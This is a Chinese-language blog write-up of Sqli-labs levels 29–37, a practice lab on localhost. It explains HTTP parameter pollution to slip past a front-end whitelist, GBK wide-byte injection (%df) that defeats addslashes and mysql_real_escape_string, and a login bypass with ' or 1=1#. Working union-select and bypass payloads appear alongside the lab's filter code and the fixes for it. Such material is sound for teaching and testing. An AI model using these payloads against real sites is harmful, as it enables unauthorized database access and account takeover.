      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/01/Sqli-labs Less29-37/" itemprop="url">Sqli-labs less29-37</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-01T08:15:41+08:00">
                2018-11-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>刚开始做这关,直接在<code>index.php</code>注的,无任何防护,直接联合注入即可,但是返回去看网上的教程发现题目应该是要求在<code>login.php</code>页面进行注入</p>
<p>index.php直接联合注入即可:    </p>
<pre><code>http://127.0.0.1:86/less-29/index.php?id=-1&apos; union select 1,database(),3%23
</code></pre><p>login.php的注入:</p>
<p><code>login.php</code>关键过滤代码:</p>
<pre><code>function whitelist($input)
{
    $match = preg_match(&quot;/^\d+$/&quot;, $input);
    if($match)
    {
        //echo &quot;you are good&quot;;
        //return $match;
    }
    else
    {    
        header(&apos;Location: hacked.php&apos;);
        //echo &quot;you are bad&quot;;
    }
}
function java_implimentation($query_string)
{
    $q_s = $query_string;
    $qs_array= explode(&quot;&amp;&quot;,$q_s);


    foreach($qs_array as $key =&gt; $value)
    {
        $val=substr($value,0,2);
        if($val==&quot;id&quot;)
        {
            $id_value=substr($value,3,30); 
            return $id_value;
            echo &quot;&lt;br&gt;&quot;;
            break;
        }

    }

}
</code></pre><p>代码逻辑:<br>1.首先用<code>$_SERVER[&#39;QUERY_STRING&#39;];</code>获取?之后的查询字符串,然后去<code>java_implimentation()</code>函数过滤,返回id参数的值。<br>2.将返回的id参数的值给了函数<code>whitelist</code>,如果是数字则查询,否则跳转到<code>hacked.php</code></p>
<p>重点:<br>此处服务器配置情况:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.12.41.56-image.png" alt="2018-10-31.12.41.56-image.png"><br>然后假设我们发送一个请求:<br><code>http://127.0.0.1:86/less-29/login.php?id=1&amp;id=2</code><br>对于这个请求,<code>apache(php)</code>解析最后一个参数,即显示id=2的内容，<code>Tomcat(jsp)</code>解析第一个参数,即显示id=1的内容</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.09.43.42-image.png" alt="2018-10-31.09.43.42-image.png"></p>
<p>那这一关,根据该处的服务器配置情况,客户端的请求首先经过<code>tomcat</code>服务器,<code>tomcat</code>会解析第一个参数,接下来<code>tomcat</code>去请求<code>apache(php)</code>服务器,而<code>apache</code>会解析最后一个参数,那么最终返回的肯定是<code>apache</code>处理的数据。因为在实际情况中,如果配置两层服务器的情况,往往我们会在第一台服务器做数据处理和过滤,其功能类似于一个waf。而正是因为前后两层服务器对参数解析的不同,我们就可使用<code>HPP</code>(参数污染)攻击,该攻击会对服务器和客户端造成威胁。</p>
<p>这里我们用参数污染的方式进行绕过:</p>
<pre><code>login.php?id=1&amp;id=1&apos; and 1=1%23
</code></pre><p>进入<code>java_implimentation()</code>函数的是?后面的整个字符串,返回的是第一个字段内容1,为数字成功绕过第一步的<code>tomcat</code>服务器的检测,到达<code>apache</code>服务器,执行第二个参数的语句。<br>然后后面的话,改变第二个参数的值即可。</p>
<h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>将less-29的闭合符<code>&#39;</code>变为<code>&quot;</code>即可。</p>
<h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>将less-29的闭合符<code>&#39;</code>变为<code>&quot;)</code>即可。</p>
<hr>
<p>HPP:<br>HPP不是一种漏洞,但是在网站存在waf的情况下可以帮助攻击者绕过waf。HPP参数污染,简单的讲就是给相同名称参数赋上两个或两个以上的值,导致应用程序以意外方式解释值而出现漏洞。</p>
<p>我们把搜索的参数赋2个值看下<br>baidu:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.16.22.19-image.png" alt="2018-10-31.16.22.19-image.png"></p>
<p>bing:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-31.16.23.49-image.png" alt="2018-10-31.16.23.49-image.png"></p>
<p>百度取第一个而bing搜索取第二个参数,这是因为不同的网站(服务器)对相同参数的处理方式不同。</p>
<p>我们less-29就是<code>waf(tomcat)</code>检验的是第一个参数值而<code>apache</code>服务器执行的却是第二个参数值导致绕过了waf。</p>
<hr>
<p>下面的几关都是涉及宽字节注入的,我们介绍一下宽字节注入的原理及用法:<br>原理:mysql在使用GBK编码时,会认为2个字符为1个汉字,例如<code>%df%5c</code>就是一个汉字,程序在过滤’时,一般会选择将’转化为\’,对于攻击者来说,绕过这种过滤,一般有两种思路:</p>
<p>1.将\吃掉  具体原因:<code>urldecode(\&#39;)=%5c%27</code> 我们在前面添加%df使其变成<code>%df%5c%27</code> 而根据上面提到的,mysql在GBK编码时会将2个字节当作一个汉字,此时<code>%df%5c</code>就是一个汉字,%27被当作单独的符号在外面,就达到了使单引号逃逸的目的。    </p>
<p>2.将\过滤,例如构造<code>%5c%5c%27</code>,第一个\转义第二个\,也可以使得单引号’逃逸,不过这种情况只适用于\没有被过滤得情况</p>
<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>我们尝试payload:</p>
<pre><code>http://127.0.0.1:86/less-32/index.php?id=-1%df%27 union select 1,user(),3%23
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.09.32.32-image.png" alt="2018-11-01.09.32.32-image.png"></p>
<p>可以看到<code>&#39;</code>成功逃逸,造成注入。</p>
<p><code>less-32</code>代码:</p>
<pre><code>function check_addslashes($string)
{ //preg_quote：保持字符串,使其不适用正则表达式的特殊语义
    $string = preg_replace(&apos;/&apos;. preg_quote(&apos;\\&apos;) .&apos;/&apos;, &quot;\\\\\\&quot;, $string);          //escape any backslash
    $string = preg_replace(&apos;/\&apos;/i&apos;, &apos;\\\&apos;&apos;, $string);                               //escape single quote with a backslash
    $string = preg_replace(&apos;/\&quot;/&apos;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash


    return $string;
}
</code></pre><p>上述函数为过滤<code>&#39;</code>的函数,将’转为<code>\&#39;</code>,将<code>&quot;</code>转化为<code>\&quot;</code>,将<code>\</code>转化为<code>\\</code>,所以我们只能使用第一种方法,将<code>%5c</code>吃掉,使<code>&#39;</code>逃逸,造成注入。</p>
<p>若我们改变一下源代码,将过滤<code>\</code>的代码:<code>$string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);</code>注释掉,用第二种方法过滤掉\,使’逃逸:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.09.48.05-image.png" alt="2018-11-01.09.48.05-image.png"></p>
<p>如图可看到,<code>&#39;</code>成功逃逸。</p>
<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>less-33的过滤代码:</p>
<pre><code>function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
</code></pre><p>由代码可知,这里是用<code>addslashes()</code>函数来进行过滤的。<br><code>addslashes()</code> 返回预定字符之前添加\的字符串<br>预定义字符: <code>&#39;</code>,<code>&quot;</code>,<code>\</code>,处理方式与less-32一样,所以依旧用<code>%df</code>即可绕过。<br>注意:使用<code>addslashes()</code>函数,我们将<code>mysql_query()</code>设置<code>set character_set_client=binary</code>来设定客户端的字符集是二进制,就可防御此漏洞。</p>
<pre><code>#设置客户端的字符集为二进制,Mysql就以二进制来执行sql语句
Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);
</code></pre><h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>这一关是post型的注入漏洞,同样是将传输过来的<code>&#39;</code>进行了<code>\&#39;</code>处理,同样可用<code>%df</code>吃掉\,造成’逃逸<br>但是前几关都是基于get形式的注入,数据是以url形式提交的,因此数据会经过URLencode,那我们将<code>%df</code>先经过URLencode得到<code>�</code>,或者在burp/hackbar里用<code>%df</code>也是可以的。</p>
<p>首先在浏览器里尝试:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.11.02.48-image.png" alt="2018-11-01.11.02.48-image.png"></p>
<p>burp：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.07.48-image.png" alt="2018-11-01.11.07.48-image.png"></p>
<p>hackbar也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.06.05-image.png" alt="2018-11-01.11.06.05-image.png"></p>
<p>浏览器直接提交只能使用源字符,hackbar与burp里使用源字符与url编码过的字符都可以。</p>
<p>这里也说下万能密码:<br>提交:<code>�&#39; or 1=1#</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.14.50-image.png" alt="2018-11-01.11.14.50-image.png"></p>
<p>成功以Dumb的用户登陆。<br>我们看下源代码:</p>
<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
</code></pre><p>我们提交<code>�&#39; or 1=1#</code>,执行的sql语句为:<code>SELECT username, password FROM users WHERE username=&#39;�&#39; or 1=1#&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code><br>实际执行的语句为<code>SELECT username, password FROM users WHERE username=&#39;�&#39; or 1=1</code>,无论数据库中有无username等于�的用户,在与1=1进行了or操作后,返回值都为1,<br>所以执行这条语句返回的结果是全部<code>username</code>与<code>password,mysql_fetch_array()</code>函数每次从结果集中取得一行作为关联数组,只去了一次,所以返回id为0的账户密码:<code>Dumb 0</code>。</p>
<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p>添加单引<code>&#39;</code>测试:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.37.30-image.png" alt="2018-11-01.11.37.30-image.png"></p>
<p>报错信息:<code>&#39;\&#39; LIMIT 0,1&#39;</code>,说明这里并不需要闭合符,直接联合注入即可</p>
<p><code>id=-1 union select 1,2,database()%23</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.38.45-image.png" alt="2018-11-01.11.38.45-image.png"></p>
<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>利用方式与<code>less-33</code>无异。</p>
<p>查看源代码:</p>
<pre><code>function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}
</code></pre><p>查看代码得知是用<code>mysql_real_escape_string()</code>进行过滤的</p>
<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符<br>下列字符受影响：</p>
<pre><code>\x00
\n
\r
\
&apos;
&quot;
\x1a
</code></pre><p>如果成功，则该函数返回被转义的字符串。如果失败,则返回false。<br>注意:在使用<code>mysql_real_escape_string()</code>时,需要将<code>mysql</code>设置为<code>gbk</code>:<code>Mysql_set_charset(&#39;gbk&#39;,&#39;$conn&#39;)</code></p>
<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>利用方式与less-34无异<br>代码与less-34的区别是post内容用的是<code>mysql_real_escape_string()</code>函数进行处理的,而不是<code>addslashes()</code>函数,但是原理是一样的.利用方式也相同。</p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>出现宽字节的原因是在PHP连接mysql时执行了如下设置:</p>
<pre><code>set character_set_client=gbk
</code></pre><p>这句代码是告诉mysql服务器,客户端传过来的数据是gbk编码的,然后mysql服务器对查询语句进行gbk编码导致反斜杠\被<code>%df</code>吃掉,但是一般网站都不这么设置,通常的设置方法是:<code>set names &#39;gbk&#39;</code>,但是实际上这行代码不过是比<code>set character_set_client</code>多干了两件事而已,set names ‘gbk’等同于如下代码:<br><code>set character_set_connection=&#39;gbk&#39; character_set_results=&#39;gbk&#39; character_set_client=gbk</code>。<br>代码意思是:mysql服务器接收客户端数据,认为他的编码是<code>character_set_client</code>,然后将其转化为<code>character_set_connection</code>的编码,然后进入表及字段,转化为字段对应编码,执行完sql语句返回的结果转成<code>character_set_results</code>编码,返回客户端。</p>
<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法:"></a>修复方法:</h4><blockquote>
<p><strong>A</strong>.所有sql语句前指定一下连接的形式是二进制:set names ‘gbk’,character_set_client=binary或者直接(SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary)<br>    <strong>B</strong>.先调用mysql_set_charset(‘gbk’)设置连接所使用的字符集为gbk,然后使用mysql_real_escape_string()来过滤用户输入。<br>    <strong>C</strong>.使用PDO模式,在PHP5.3.6及以下版本,需要设置serAttribute(PDO::ATTR_EMULATE_PREPARES,false);来禁用prepare statements的仿真效果(本地模拟预处理),这个在之前复现TP框架的洞时有涉及:<br>    <a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">ThinkPHP5.x设计缺陷泄露账户密码+鸡肋sql注入</a>         </p>
</blockquote>
<p>但是还存在一种特殊情况,就是<code>iconv()</code>的错误使用导致上面的方法前功尽弃,例如：很多cms使用<code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code>来转换编码,目的是避免乱码。但是在utf-8转向gbk或者在gbk转向utf-8时,会多处一个%5c将转义符(反斜杠)转义,造成后面的单引号逃逸,也会造成注入。</p>
<h4 id="CMS挖掘"><a href="#CMS挖掘" class="headerlink" title="CMS挖掘:"></a>CMS挖掘:</h4><p>挖掘宽字节注入的方法也比较简单,只要搜索如下几个关键字即可:</p>
<pre><code>set names
character_set_client=gbk
mysql_set_charset(&apos;gbk&apos;)
iconv(
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">57</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
